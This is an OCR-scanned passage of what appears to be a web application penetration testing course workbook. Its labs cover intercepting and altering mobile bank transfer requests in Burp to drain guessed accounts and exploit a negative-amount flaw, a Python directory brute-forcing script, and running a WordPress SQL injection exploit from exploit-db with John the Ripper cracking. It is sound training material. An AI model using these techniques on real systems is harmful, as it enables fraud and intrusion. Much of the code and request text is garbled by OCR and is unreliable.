'-----' 
'--./ 
'-' 
'--../
'-' 
\...._/ 
'--./ 
'-----' 
'-----' 
'--../
'-'
\...._/
'--../
'-----'
'-----'
'-' 
'----"' 
'-----' 
'-----' 
'---' 
'-" 
\....,
4 
\....,
'-" 
'-" 
Check Your Balances 
Go to Accounts and check your balances. 
Note that account numbers are eight digits: 
"' 
• 
Debit account number begins with 1. 
,,-.._ 
• 
Credit account begins with 2. 
Click Back. 
Then, go to Transfer. 
Keep your debit account (19520311) and credit account (29520311) numbers in mind: Inference plays a 
key role in this lab. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 5.2: Mobile MITM 
5 
- 
Transfer Funds 
'--' 
Enter a transfer of 100 from Debit to Credit. 
• 
If the Android virtual keyboard pops up, press <ESC>. 
'--' 
'--' 
'--' 
'--' 
'-...,,/ 
'-...,,/ 
'--' 
'-' - 
'-/ 
'--' - 
Then click Transfer. 
--.__,I 
'--' 
Return to Accounts to verify the transfer was successful. 
- 
'--' 
'--' 
'---' 
'-' 
'--' 
'--' 
'--' 
'----' 
'--' 
'--' 
'--' 
'--' 
Note: Sometimes the accounts and Transfer menus show an old (cached) amount. Press Back and then 
reload the menu to update the content. 
'--' 
'--' 
.____., 
'--' 
'--' 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 5.2: Mobile MITM 
6 
'--' 
'--' 
'--' 
View the Transfer in Burp 
SwitchtoBurpandgotoTarget -> Site map-> http://192.168.l.8 -> transfer. 
Con!'\acti on:: c lc!ile 
, Content·L8ngth: 54 
Accept-encoding: 9::ip 
.ith)Unt:=100. O&f ron)_~cc:ount.;::193203! l&to _~ccount=2!:S203l l 
Here is a close-up of the screen: 
hiding css. image and general 
I,, 
http:11192 .ise.i.s.eoeo 
""ti accounts 
1-, ($ login 
ye transfer 
µ ~· amoUDt;;;;ioo]i&irom acco~nt=t95203ai :t&teii. account= 
; 
Review the Raw request, which we will next intercept and change: 
POST /transfer?session_key=qrPMchdFE9iQGd8EhrCOl1'62Ff xqllf,IJTFQv HTTP/1. l 
Content - Type : app li cation/ x - 'W'w"'FI· form- u r lencoded 
User-Agent: Dalvik/1.4.0 (Linux; u; Android 2.3.3; sdk Build/GRI34) 
Host: 192.168. l. S:8008 
Connection: close 
Content-Length: 54 
Accept-Encoding: gzip 
amount=lOO.0&from_account=l95203ll&to_account=2952O311 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 5.2: Mobile MITM 
7 
[challenge: No Hints 
'--' 
'--' 
Your friends, Ford Prefect (fprefect) and Marvin, also have accounts at this bank 
• 
They each have $1000 in debit and $500 in credit 
Your goal: 
• 
Infer what their account numbers may be 
• 
Your account numbers: 19520311 (debit) and 29520311 (credit) 
• 
Use Burp intercept to alter transfer requests and steal a total of $3000 from both 
Bonus goal: 
• 
Use your application testing skills to become (at least) a millionaire 
This challenge requires inference: What might Ford and Marvin's account numbers be? There's no 
black/white answer, but clues have already been provided. 
'---' 
'--' 
'--' 
'--' 
'--' 
'--' 
'-..,/ 
'-..,/ 
'-..,/ 
'-..,/ 
'--./. 
It turns out there are at least two flaws in this app. One allows you to steal all the money from an account, 
but you can't steal any more than the total. 
A related, but different, logic flaw allows you to steal an unlimited amount of money from an existing 
account. 
'-..,/ 
'-..,/ 
'-' 
'-..,/ 
'---' 
Step-by-step instructions begin on the next page. 
Choose your own difficulty! 
'--./ 
'--' 
'-..,/ 
'-..,/ 
'-..,/ 
'--' 
'--' 
'-..,/ 
'--' 
'--./ 
'---' 
'--' 
'---' 
'-' 
'--' 
'--' 
'--" 
'--./ 
SEC542 -© 2018 Seth Misenar and Eric Conrad 
Lab 5.2: Mobile MITM 
8 
'-..,/ 
'-' 
'--' 
!step-by-Step Instructions 
First, inference: What could Ford and Marvin's account numbers be? 
Your account numbers are 19520311 (debit) and 29520311 (credit). 
Web app pen testers always try a zero, often followed by a positive one and negative one. None of those 
work in this case. 
Pen testers next try adding and subtracting one from a known account and then expanding out from there. 
Let's focus on debit accounts and try a range of+/- two digits. Candidates accounts are 19520309, 
19520310, 19520312, and 19520313. If any of these work, inferring the related credit accounts will be 
easy. (Change the first number to 2.) 
,-.._ 
Go to the app, prepare a transfer of 1000 from Debit to Credit, but do not click Transfer yet: 
• 
Then go to Burp-> Proxy and turn intercept on. 
Sequencer Decoder 
Extender Options 
Alerts 
• 
Then go back to the app and click Transfer. 
Burp will intercept the transfer. 
POST /transter?sess1on_key=MeXFmlf Oy1plbELDuXoTEcvuX0YIIeJ HTTP/1.1 
Content- Type: app Li cat i on/:x-v.t11M- fa rm- u r Lencodad 
User-Agent: Dalvik/1.4.0 (Linux; u; Android 2.3.3; sdk Build/GRI34) 
Host: 192.168.1.8:8008 
Connection: Keep-Alive 
Content-Length: 55 
Accept-Encoding: gzip 
amount=l000.f)&from_account=l95203ll&to_account=29520311 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 5.2: Mobile MITM 
9 
Change the Transfer 
'----' 
'----' 
Go to Burp and change the from_account to 19520309: 
..___, 
'-' 
amount=lOOO.O&from account=19520309&to account=29520311 
'-' 
arnount=lOOO.O&frorn account=l9520309&to account=29520311 
'-' 
'-' 
Then, turn Intercept off and check your balance. 
• 
Bummer, strike one! 
• 
Thankfully, bad guesses are free! 
...___,, 
'-' 
'-" 
Go back to the app, prepare another transfer of 1000, but do not click Transfer yet. 
• 
Go to Burp-> Proxy and turn intercept on. 
• 
Then go back to the app and click Transfer. 
Go to Burp, and change the from_account to 19520310: 
amount=lOOO.O&from account=19520310&to account=29520311 
'-' 
'-' 
'-' 
'----' 
'-' 
jarnount=l000.0&frorn_account=l9520310&to_account=29520311 
'-" 
'-" 
Then turn intercept off. 
'-' 
'---' 
The JSON in the response looks promising: 
'----' 
f • 
http://l92 ,168,1.8:8080 
.. e accounts 
~ ® login 
• ® transfer 
amount= 100 ,0&from_ account= 19520311 &to_ account= 2 952 0311 
= 
·--· 
__ 
,- I 
t~amount==l000,0&from account=19520,309Mo account==29520311 '. 
[ Request f ,,R,esponseJ• 
54 amount= 1000 . .o&from account=19520310&to accounl:==29520311 I ·=!·=====···=·~· ,~i=
.·=
· ''::·c::=
· '=
' ,J·cc
· ===================:cl 
. 
. 
1:: f Raw l Headers fH~ 
'----' 
'-' 
l,°kTP/1. l 200 OK 
Content-Type: text/html; charset=utf-8 
Content· Length: 
17 
Connection: close 
Date: Sun, 21 Jan 2018 02:53:08 GMT 
Server: Secu n ty542 
bll:"success": "Sl "} 
.. 
r 
'---' 
'--' 
'----' 
'----' 
'-' 
'-' 
..___, 
'---' 
..___, 
'--' 
'-' 
'----' 
'---"' 
'---"' 
SEC542 -© 2018 Seth Misenar and Eric Conrad 
Lab 5.2: Mobile MITM 
10 
'---' 
..___, 
'- 
Success! 
We stole $1000 from our good friend! 
Note: Sometimes the transfer or accounts screen will cache an old amount. Click Back and reload the 
screen to update. 
" 
Repeat previous steps to identify the second debit account (19520313) and steal $1000 from it. 
Use your keen powers of inference to determine the matching credit accounts. Your credit account 
number is the same as your debit, except it starts with a 2. Applying this pattern to the known credit 
accounts reveals two potential credit accounts: 29520310 and 29520313. 
Then, repeat previous steps to steal $500 each from accounts 29520310 and 29520313. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 5.2: Mobile MITM 
11 
The Bonus 
Three thousand dollars isn't a bad haul, but our greed has not been satisfied. Our greed is like the 
Ravenous Bugblatter Beast of Traal's hunger: Never-ending. 
Lucky for us, there is a logic flaw that may help satisfy our ravenous greed. 
Ponder this metaphorical question/hint: What happens if I give you negative 1 million dollars? 
Spoiler alert! The answer is on the next page. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 5.2: Mobile MITM 
,.___., 
'--' 
\...,, 
'--' 
'--" 
'--' 
'---' 
'---' 
'--' 
'--" 
'---' 
'-...../ 
'--" 
'--" 
'-.../ 
'-.../ 
'---' 
'--" 
___, 
'--" 
'--" 
'--" 
'-...../ 
'--' 
'--" 
,.___., 
'--" 
'-../ 
'--" 
'-.../ 
'---' 
'-../ 
'-../ 
'--' 
'--' 
'--' 
'---' 
'-' 
'-...../ 
'--' 
12 
'-.../ 
'---' 
'---' 
The Power of Negative Thinking 
Let's get negative for a moment: What if I transfer negative 1 million dollars from myself to you? 
" 
• 
If I give you 1 million dollars, you have gained 1 million dollars. 
• 
If I give you negative 1 million dollars ... 
Prepare a transfer of 100 from debit to credit: 
• 
Go to Burp-> Proxy and turn intercept on. 
• 
Then go back to the app and click Transfer. 
In Burp: 
• 
Change the amount to -1000000 
o There are six zeros. Be sure to remove the trailing .0 
• 
Change to_account to 29520313 
• 
Do not change from_account! 
Your transfer should be: 
amount=-lOOOOOO&from account=19520311&to account=29520313 
amount=-1000000&frcm account=l95203ll&tc account=29520313 
Turn intercept off and check your balance. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 5.2: Mobile MITM 
13 
'---" 
One Miiiiillion Dollars 
-.__I 
·-.__, 
We stole more than one million dollars. 
Who says crime doesn't pay? 
That wraps up this lab. Please close the Android app, bank-server, and Burp. You may simply close the 
Android application and Burp, and press CTRL-C in the terminal running bank-server. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 5.2: Mobile MITM 
-.__I 
'-.J 
'--" 
'--' 
-._, 
'--" 
'--" 
'-.J 
'-.J 
'-.../ 
'-.../ 
'--" 
'--' 
'---'' 
-._, 
'--' 
'--" 
,.___, 
,.___,. 
'-.../ 
'-.J 
'-.J 
'-.J 
'---' 
'--' 
,.___, 
'-.../ 
'-.J 
'--" 
'-.J 
'--" 
'---' 
'--' 
'--' 
'--' 
'-.J 
14 
-.__I
'---' 
'-.J 
!credits 
The application was graciously developed by Security Compass and shared with the community. 
http:/ /securitycompass.com/ (https:/ /cyber.gd/542_ 426) 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 5.2: Mobile MITM 
15 
~ 
~ 
~ 
- 
O - 
- ~-- - 
> 
~ 
- 
Z 
?~ 
- - 
- 
X 
X 
-_ 
- 
- 
~ 
= 
- 
~: ·. 
· · -~:=' __ .-==··_. -__ 
-:._ Eiencise:r5}3L=·_;_ -Pv{Jjori~ .. ~ · 
· 
·=·~·{:L: .. -- · 
; 
~- 7 
=::i~ X 
;::= 
:~-- 
- - ~>~: 
5~-,:;}:==_ :: - 
> 
~ ~; " 
~ 
-:-:;;~~ ~-- 
J1~~ 
? :=~~~;~--~:~ - ~ 
- 
~7i~ - y::--~ ~~ 
~ 
~ 
" 
Objectives 
• 
Write simple but powerful Python scripts that use the Requests library 
• 
Primer on the power of Python for web application testing 
• 
Use Python to read HTTP Response Headers and write them to a file 
• 
Write a simple directory brute forcing script 
,-._ 
jLabNote 
'°' 
This exercise has two challenges, in multiple parts: 
• 
The challenges (specific, but brief) 
• 
Some hints (a nudge in the right direction) 
• 
Complete code 
~ 
This approach allows you to choose your own difficulty. 
The Python code required to complete both challenges is described in the previous lecture section. Be sure 
to check the lecture notes pages as well for additional hints. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 5:3: Python 
1 
jchall!J!'1*:: No Hints 
'---' 
'-" 
Challenge #1 
'---' 
'---' 
• 
Write a Python 3 script to print the server product string (only) from a list of web servers contained 
in a text file 
• 
Create a text file and add these two URLs: 
o https://www.sec542.org 
o https: //heart .bleed 
• 
Read the script, loop through each entry and connect to each HTIPS server 
• 
Do not verify the x.509 certs (otherwise, https://heart.bleed will trigger an error) 
• 
Print the URL, followed by 
11: 
11 followed by the server product string 
'--./ 
'--./ 
'---' 
'---' 
'--./ 
'--./ 
'--./ 
'--./ 
'-' 
'--./ 
'--./ 
'--./ 
.____, 
'---' 
'---' 
'--./ 
'-../ 
.._, 
.._, 
'--./ 
'---" 
'---' 
'------' 
.____, 
'--./ 
'--./ 
'--./ 
'--./ 
'-.../ 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 5.3: Python 
2 
'--./ 
'-./ 
.._, 
Challenge #2 
There is a 'secret' three-letter directory at http://www. sec542. org 
Goal: Use Python 3 to write a 'true' directory web brute forcing script, and discover all three-letter 
directory names (lowercase) at http://www.sec542.org 
Discover http://www. sec542. org/ aaa/ ->http://www. sec542. org/zzz (and all 
combinations in between) 
Note: You may be wondering: why not 4 characters, or 5, or 6 ... ? 
Those will also work fine, but each additional character requires 26 times more requests (and will take 
roughly 26 times more seconds to complete). So, brute forcing 4 characters would require 456,976 
requests, 5 characters would require 11,881,376 requests, 6 characters would require 308,915,776 
requests, etc. 
For this Proof-of-Concept lab: 3 characters will complete in minutes or less, depending on your host CPU 
and RAM, VM RAM, etc. 
Here are the timing metrics on a 2015 MacBook Pro with 16 gigs of RAM and 2.8 GHz Intel Core i7 CPU, 
using VMware Fusion to run the Security542 VM. (Remember: Your mileage may vary, depending on your 
host hardware.) 
• 
3 characters: 20 seconds 
• 
4 characters: 9 minutes (equal to 540 seconds, and the laptop CPU fan began to crank) 
• 
5 characters: 3 hours, 44 minutes, and 53 seconds (equal to 13,493 seconds, and adding 1.5 
gigabytes of Apache log files) 
We also tried brute forcing 3 characters vs. an Internet web server (instead of locally via the VMware host- 
only adapter), which was much slower (~19 minutes to complete, compared to 20 seconds locally), but still 
quite practical. 
This lab contains three levels of hints: 
• 
These challenge pages (no hints) 
• 
The next page contains some hints 
• 
The following pages contain a complete walkthrough 
Choose your own difficulty! 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 5.3: Python 
3 
[some Hints 
'--" 
'-..I 
General Hints 
'-..I 
'-" 
Begin each script with the following code: 
'-J 
'-J 
#!/usr/bin/python3 
import r.equests 
'-J 
...__,, 
...__,, 
Remember to include parentheses around variables in print functions, like this: 
'~ print 
.. (varictbl e) 
...__,, 
'-" 
m 
, ,~~"""'A1iS2&mt:%~.%)11iiirb!1:iJt:Jtt 
. w;. 
-~L&.:a.:z:::c::::: 
,-,~At::t::t::;;\.$:1;.; 
'-~= ,xi 
J 
'----' 
You can add text together like this (this is an example; your text will contain different data): 
fname="arthur" 
lname= llden.t 11 
print {f'f:i.rstname f ll+f.name+ 11, lastname: 
11 +lname) 
'----' 
'-" 
...__,, 
'----' 
This will print: 
...__,, 
'-J 
firstname: arthur, 
tname: dent 
...__,, 
'----' 
Note: We will cite slide names (instead of slide numbers), because slide numbers often change, and we'd 
like to avoid dependencies. 
Challenge #1 
The slide titled "Putting (a Lot of) It Together" shows how to read a file into a Python list and loop through. 
• 
The last line of that script shows how to print variables+ text, etc. 
The notes of the slide titled "So, It's Simple, Just Use Python 3, Right?" shows how to print the product 
string. 
'-" 
'----' 
'----' 
'-" 
'----' 
'----' 
'-J 
'--" 
'-" 
'----' 
'-" 
...__,, 
'----' 
'----' 
'----' 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 5.3: Python 
4 
'-" 
'-..,, 
'-..,, 
Challenge #2 
Note: These hints are descriptive, and not actual code. 
,.-----_ 
• 
Use /usr/bin/python3 
• 
Import the Requests library 
• 
Import ascii_lowercase from the Strings library 
• 
Create three nested loops, adding 3 characters in the third loop to create a directory variable 
• 
Check http://www.sec542.org/directory 
• 
Print if status_code is not 404 
• 
Remember to put parentheses around any print() function options (Python 3 requires this) 
• 
See previous lecture for all relevant syntax details 
,----,, 
A full walkthrough begins on the next page. 
Please remember that the previous Python lecture contains code examples for every required element of 
these challenges. If you'd like to challenge yourself, look back through the lecture and build the scripts 
based on the relevant syntax shown there. 
Also, remember that editors such as gedit and vim provide helpful syntax highlighting. 
We love vim and have been using it for decades because we don't know how to quit. 
,,----,, 
For the non-initiated, gedit offers a much easier learning curve. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 5.3: Python 
5 
'---' 
jstep-by-Step Instructions 
'--' 
'--' 
The Python examples in 542 are designed to be powerful but simple. We avoid complicated syntax and 
stick to the KISS principal ("Keep It Simple, Silly" is a polite spelling of that acronym). 
If you find a different and/or better way of achieving the exercise goals, please share with your instructor! 
We often learn from students this way and have been led to try new tools, libraries, etc., based on the 
recommendation of experienced students. 
The saying "There is more than one way to do it" (TIMTOWTDI} comes from the Perl programming 
language, which is famous for providing "more than one way" to do things. 
The Zen of Python1 disagrees: "There should be one - and preferably only one - obvious way to do it."? 
This is an ideal goal, but one that is not always executed (especially outside of the core Python code). 
Remember all of the Python HTIP libraries we discussed in the previous lecture? Yup, many ways to do 
things. 
The Requests library is awesome because it abstracts low-level details from the programmer. Which is 
great, until you need to access some nitty-gritty low-level details that have been abstracted away. For 
example: Forcing the cipher used in an SSL/TLS connection, which requires use of the underlying urllib3 
library.3 
'-' 
'--' 
'--' 
'---' 
'---' 
'---' 
'-" 
'---' 
'---' 
'-' 
'---' 
'-..; 
'--' 
'---' 
'-..; 
'--' 
'-' 
'--' 
'-' 
'-' 
'-' 
'-' 
'-' 
'--' 
'--' 
'--' 
'-' 
'-.../ 
'-..; 
'-' 
'-' 
'-.../ 
'-' 
'-.../ 
'-.../ 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 5.3: Python 
6 
'-..; 
'-.../ 
'--' 
Challenge #1 
Create /home/student/urls. txt: 
I .. ~ gedi t /home/ studen.t:zurls: ~xt .··.· ..... ·.··•··· ~ .,:. 
· ,,,,.,.,.>,=-·-·--'h" ., -- 
'--'~---------",._,,,.,._,.,,.1 ""' "_,,.,,.., · ·02XiWt ;;;;;;;;au ;;m;u ;;ms , JtWPAU.MM4¾¼JSAWJMMW;liMs,:@d,;,#$.¼J¼¼4% ht 
4 .WM S44U,4k4¼&MWUA4$¥,AtMme:;:w:.:uj4%4X;;:;t,:;;;;µ, 
Type these two URLs in gedit: 
• 
https://www.sec542.org 
• 
https://heart.bleed 
File 
Edit 
View 
Open 
Help 
+ 
X 
https://www.sec542,.org 
https://heart.bleed 
I 
. 
Save urls.txt in gedit. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 5.3: Python 
7 
Type the following command in a terminal and enter the code shown in the image: 
'-._/ 
'-._/ 
$ gedit /home/student/challen 
'-._/ 
'-' 
T 
- + 
M 
File 
Edit View 
.. 
challenge l .py 
#!/usr/bin/python3 
import requests 
with 0pen(1/home/student~urls.txt1) as f: 
urls = f. readt] .splitlines() 
for url in urls: 
r = requests.get(url, 
J 
print (url+": "+r.headers[ server')) 
INS 
,t 
'-' 
'-' 
'--..., 
'-' 
'-' 
'-' 
'-' 
'-' 
'-' 
'-../ 
Here is the completed script, with additional comments added. A copy of this script is in 
/home/student/Desktop/python/challengel.py 
Please note: Use the version in the previous image to create the script, not the commented version 
following. The version below will run fine, but typing all the comments will take extra time. It will be much 
faster/easier to type the version in the previous image. 
#!/usr/bin/python3 
import requests 
with open('/home/student/urls.txt') as f: 
# The following line reads each line of urls.txt into a Python list 
# splitliness() removes the newlines at the end of each line 
urls = f. read() • splitlines () 
# Loop through each URL: 
for url in urls: 
# Set verify=False to avoid errors for self-signed x.509 
certificates 
r = requests .get (url1verifyd:JtaJ..13,) 
print ( ur 1 + 11 : "+ r. heade.rs £ r set'VE!!X- 1 J J 
Save /home/student/challengel.py in gedit. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 5.3: Python 
'-' 
'-' 
'-' 
'--..., 
'-' 
'-' 
'-../ 
'-' 
'-' 
·-..J 
'--..., 
'-' 
'-- 
'-.../ 
'-._/ 
..__,, 
'-' 
'-.../ 
'-._/ 
'-' 
'-' 
8 
'-' 
'-../ 
'----' 
Then make the script executable by typing the following in a terminal: 
Finally, run the script. 
If you have performed the following steps carefully, you will see this output: 
[-]$ /home/student/challengel.py 
https: //WWW. sec542. o rg: 
.Apache/2. 4. 7 ( Ubuntu) 
: //heart. bleed: nginx/1 .. 5. 9 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 5.3: Python 
9 
Challenge #2 
'--' 
'--'
Type the following command in a terminal and enter the code shown in the image: 
'--'
'--' 
$ gedit /home/student/challenge2.py 
'--' 
'--'
'--'
'-../ 
'--'
'-' 
'-../ 
!/usr/bin/python3 
import requests 
from .string import ascii_lowercase 
url="http: //www. 
. org/" 
for charl in ascii lowercase: 
char2 in ascii_lowercase: 
for char3 
ascii_lowercase: 
directory= charl+char2+char3 
r = requests.get(url+directory) 
if r. status code != 404: 
print (url+directory+" : "+str{r~status code)) 
'-../ 
'--'
'-../ 
'-../
'-../ 
lu·· 
+ i 
I . 
'-' 
'--"
'-../ 
Here is the completed script, with additional comments added. A copy of this script is in 
/home/student/Desktop/python/challenge2.py 
'--' 
'--" 
'-' 
'-'
Please note: Use the version above to create the script, not the commented version below. The version 
below will run fine, but typing all of the comments will take extra time. It will be much faster/easier to type 
the version in the image above. 
'-' 
'-'
'-'
'--' 
#!/usr/bin/python3 
import requests 
from string import ascii_lowercase 
url="http://www.sec542.org/" 
# Base URL 
for charl in ascii_lowercase: 
# Will loop 26 times 
for char2 in ascii_lowercase: 
# Will loop another 26 times 
for char3 in ascii_lowercase: # Will loop yet another 26 times 
# this section will run 17,576 times (26*26*26) 
directory = ...... <::~a:t'.l+char2+char3<•# directory will be •aaa• through 1zzz1 
# Request ht:tpi//www. sec542 Forg/a.aa (etc ... ) 
r = reque.ste;tget (url+directory) 
if r. s tatus.:._code ! = 4 04: # if status code is not4 !Not Found 
11 
(404) : 
# Python 3<requires parenth~ses around print options, 2 does Iiot 
print (urLfd.irectory+" : 
"+str(r.status_code)) 
\.._/ 
'-' 
'--'
'-'
'--'
'-'
'-' 
'--'
'-' 
'-'
'-'
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 5.3: Python 
10 
'---' 
'-' 
'-'
Save /home/student/challenge2 .py in gedit. 
,,.....__ 
Type the following in a terminal: 
/home/ 
: //WWW. sec.542. 
llenge2.py 
rg/ 
: 200 
If you see the content as in the preceding screenshot, you have completed this exercise successfully! Note 
that the details of the output (such as the 
11 
: 
11 between the directory and the HTIP status code) are not 
important, the main goal is to achieve the desired functionality. 
We have discovered the directory/url: http://www. sec542. org/pwn/ 
Be sure to surf there in a browser to see if there's anything interesting. 
Remember that we have copies of the scripts, so you can check your work: 
/home/student/Desktop/python/challengel.py 
/home/student/Desktop/python/challenge2.py 
That wraps up our lab! Note that we have added two advanced Python bonus challenges in an appendix at 
the end of the 542.5 book. Feel free to work on these during breaks or after class. 
The challenges include: 
• 
Write a Python script to launch a John-the-Ripper style hybrid password-guessing attack against a 
website using Basic Authentication 
• 
Write a Python script to automate the high-score submission in the Snake game we played on day 
1, repeatedly submitting slightly higher scores, achieving a listed high score of at least 10,000 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 5.3: Python 
11 
[References 
[1] https;//www.python.org/dev/peps/pep-0020/ (https://cyber.gd/542_547) 
[2] Ibid. 
[3] https://lukasa.co.uk/2013/01/Choosing_SSL_ Version_! n_Requests/ (https://cyber.gd/542_548) 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 5.3: Python 
.......,, 
...._, 
...._, 
, ..... ..: 
...._, 
.......,, 
.......,, 
...._, 
.......,, 
.......,, 
...._, 
.......,, 
.......,, 
.......,, 
...._, 
'--' 
.......,, 
.......,, 
.......,, 
'--' 
.......,, 
.......,, 
,._, 
.......,, 
,._, 
.......,, 
...._, 
.......,, 
'--' 
.......,, 
,._, 
'-" 
,._, 
,._, 
'-../ 
'-../ 
.......,, 
.......,, 
'--' 
'-../ 
12 
'-..,.., 
'-..,.., 
'-../ 
"' 
I ObjE?ctives 
• 
Leverage WPScan to facilitate exploitation of Word Press using an off-the-shelf exploit 
• 
Become familiar with using WPScan 
• 
Use the results of WPScan to guide exploitation 
• 
Understand the need to edit off-the-shelf exploits 
• 
Use JtR (John the Ripper) community-enhanced version to crack an exposed password hash 
"' 
i Lab Note 
This lab uses WPScan, a well-known automated scanner for Word Press. We scan a Word Press install and 
proceed to exploit it. 
Note: There are two main versions of John the Ripper (JtR): The release version (located in /usr/sbin/john 
on the Security542 Linux VM), and JtR community-enhanced version (located in /opt/john/run/john in the 
course Linux VM). What's the difference? The community-enhanced versions support *many* more 
hashes, especially hashes used by web applications and databases: 
This version integrates lots of contributed patches adding GPU support (OpenCL and CUDA}, support for 
a hundred of additional hash and cipher types (including popular ones such as NTLM, raw MD5, etc., 
and even things such as encrypted OpenSSH private keys, ZIP and RAR archives, PDF files, etc.}, as well 
as some optimizations and features. Unfortunately, its overall quality is lower than the official 
version's. 1 
This lab uses the JtR community-enhanced version to crack raw MDS hashes, which the mainline JtR 
cannot do. There is one downside that typically affects less than 2% of SEC542 students: The JtR 
community-enhanced version requires SSE2 CPU support in the host CPU. Some inexpensive and/or older 
laptops lack this CPU feature. One example is the 2010 MacBook Air. 
You can test by typing the following command: /opt/john/run/john 
"' 
Your host CPU lacks SSE2 if you see this error: Sorry, SSE2 is required for this build 
In this case: If you have Internet access, simply run a Google search of the hash. Many on line rainbow 
tables have cracked it. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 5.4: WPScan 
1 
!challenge: No Hints 
Target: http://www.sec542.org/wordpress/ 
• 
Run WPScan against the target install. 
• 
Leverage the exploit-db (/opt/exploit-database) referenced vulnerability. 
• 
Customize the exploit-db script and launch exploit to return the admin account's password hash. 
• 
Crack the password hash using John the Ripper (/opt/john). 
• 
Log in to target with cracked credentials. 
• 
Use sqlmap as an alternate path to password hash theft. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 5.4: WPScan 
'-'. 
'-J 
\_,I 
\_,I 
'---" 
'---" 
'-' 
'-J 
'-' 
\_,I 
\_,I 
\_,I 
'-' 
'-' 
'-../ 
'-' 
'-../ 
'-' 
'-' 
'-' 
-......,· 
'-' 
'-' 
'-' 
'-../ 
'-' 
\_,I 
'-' 
\_,I 
'-' 
'-' 
\_,I 
'-'' 
'-' 
'-' 
'-' 
\_,I 
'-' 
\._,, 
2 
\._,, 
\._,, 
'-' 
" 
Step-by-Step lnstructi 
Run WPScan 
Run the following command at a terminal: 
/opt/\<1pscan/wpscan. rb - -ur l http: //WWW. sec542. org/wordpress/ 
---- 
.,., __ 
\ \ 
I I _\I _I 
\ \ I\ I I I I_) 
I (_ __ - - -- ~ 
\ \I \I I I _/\_\/_I/_. 
I 
'_ \ 
\ I\ I 
I 
I 
_) I (_I 
<_I 
I 
I 
I 
I 
\I \I 
LI 
I __ ; \_l\_,_I_I I.J 
WordPress Security Scanner by the WPScan Team 
Version 2.9.2 
. 
Sponsored by Sucuri - https://sucuri.net 
I 
@_WPScan_, @ethicalhack3r, @erwan_lr, pvdt , @_Firefart_ 
, I+ J URL: http:/ /WWW. sec542. org/wordp ress/ 
:[+] Started: Mon Feb 13 09:41:04 2017 
i ,_ 
, 
Note: When/if prompted about updating WPScan, just press 'N' followed by Enter. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 5.4: WPScan 
3 
Off-the-Shelf Exploits 
"-1 
'--" 
Search the results for references to exploit-db. You will need to scroll up in the terminal; look for "3960": 
V 
- + 
[ ! ) Title: \llordpress 2. l. 3 adain-ajax. php SQL Injection Blind Fishing Exploit 
Reference: https://wpvulndb.com/vulnerabilities/6025 
Reference: https://ww.exploit-db.com/exploits/3968/ 
We have a local copy of exploit-db on the VM. 
You can quickly find the PoC in question using searchsploit: 
$ /c,pt/ exploi t-da.tabase/ searchsploi t wordpress 3 96 0 
I 
Path 
I 
(/usr/share/exploitd' 
atforms 
Note: If you simply search for '3960' without 'word press', it will show all exploit IDs containing the string 
3960 (such as 39601). 
Make a copy of it to edit: 
$ 
/opt/exploit-database/platforms/php/webapps/'.39§0.php /home/student/ 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 5.4: WPScan 
..__, 
..__, 
..__, 
'-' 
'-' 
'-.., 
\....../ 
'-' 
'-../ 
'-../ 
'-' 
'-' 
''-.../ 
'-' 
'-' 
'--../ 
'-' 
'-' 
'-../ 
'-.../ 
'-' 
'-' 
'-' 
\.___, 
..__, 
\.___, 
'-' 
'-.../ 
..__, 
'-./ 
'-../ 
'-.., 
'-.., 
..__, 
'-.../ 
'-' 
4 
'-' 
'-.., 
..__, 
Customize the Exploit 
This off-the-shelf exploit does not require significant tweaking to apply to our particular environment. We 
will simply need to provide the path to our Word Press install in the script. 
Review the script located now in /home/student/3960 .php. Notice that the script includes a 
hardcoded path that naturally differs from what we need. 
soutf i le = 
1 ./w 
$url = 'http:/ 
$testcnt = 300 
, 
$id= 1;// ID of the target user, default 
$suffix='';// Override value, if needed 
refix = 'w '·// WordPress table 
ref ix default is nw 
is 300000 
u 
,--,. 
Edit the script to target our own system: 
$ gedit /home/student/~~60.php 
,e 
On the $url line (line 14), replace localhost/wordpress. 2 .1. 3 with: 
www.sec542.org/wordpress 
Now, save and close the file. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 5.4: WPScan 
5 
Run the Exploit 
Run the exploit: 
[ ... T ... ]?h~ /home/student/3960.php 
Tab~ 
Help 
[-]$ php /home/student/3960.php 
arget: http://Ww.sec542.org/wordpress/wp-admin/admin-ajax.php 
sql table pretax: wp 
cookie suffix: c824d0d8c538ab2ba86a35895c8dd02d 
testing probe delays 
If successful, the admin's password hash will be disclosed. 
Copy the password hash to /tmp/hash with the following command: 
-n 3858f62230ac3c915f3 
12.c63f > /tmp/hash 
Note: The -n ensures an ending newline character will not be sent, which will be important for later. 
'--' 
'--' 
I,._., 
'-.J 
J 
'---" 
,.____, 
'---" 
'-.J 
'---" 
'---" 
,.____, 
'---" 
'---" 
,.____, 
'---" 
'--' 
'----'. 
,.____, 
,.___, 
'----' 
."---' 
'----' 
,.____, 
'----' 
,.___, 
'----' 
,.___, 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 5.4: WPScan 
,.___, 
,.___, 
'---" 
,.___, 
'---" 
